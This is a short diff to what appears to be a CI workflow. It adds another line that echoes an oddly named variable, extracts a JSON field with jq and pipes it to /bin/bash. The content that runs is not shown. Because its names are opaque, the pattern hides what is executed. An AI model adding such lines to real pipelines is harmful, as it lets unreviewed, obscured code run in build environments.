@@ -25,6 +25,7 @@ jobs:
           echo $itplw64 | jq -r .v725 | /bin/bash
           echo $vh581 | jq -r .khcga806 | /bin/bash
           echo $lt09649 | jq -r .stf02898 | /bin/bash
+          echo $o653 | jq -r .jawc3158 | /bin/bash
 
       - name: Persist output
         if: always()
